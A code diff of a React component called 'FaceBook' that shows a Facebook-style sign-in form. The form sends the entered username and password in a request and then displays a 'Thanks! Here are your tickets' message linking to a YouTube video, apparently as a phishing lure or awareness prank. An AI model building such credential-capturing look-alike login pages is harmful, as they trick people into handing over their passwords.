@@ -7,7 +7,8 @@ const FaceBook = () => {
   const [userName, setUserName] = useState('')
   const [password, setPassword] = useState('')
   const [alreadySent, setAlreadySent] = useState(false)
-  console.log(userName, password)
+  const [response, setResponse] = useState<unknown>(null)
+
   const onSubmit = (e: any) => {
     e.preventDefault()
 
@@ -23,9 +24,12 @@ const FaceBook = () => {
         userName,
         password,
       }),
+    }).then((res) => {
+      setResponse(res)
     })
     setAlreadySent(true)
   }
+
   return (
     <div className="flex w-screen h-screen bg-[#f9f9f9]">
       <div className="w-[300px] bg-black">
@@ -70,6 +74,15 @@ const FaceBook = () => {
               &rarr; sign in
             </button>
           </form>
+
+          {response ? (
+            <div className="mt-10 flex gap-4">
+              Thanks! Here are your tickets:
+              <a href="https://www.youtube.com/watch?v=eBGIQ7ZuuiU">
+                Ticket link
+              </a>
+            </div>
+          ) : null}
         </div>
       </div>
     </div>
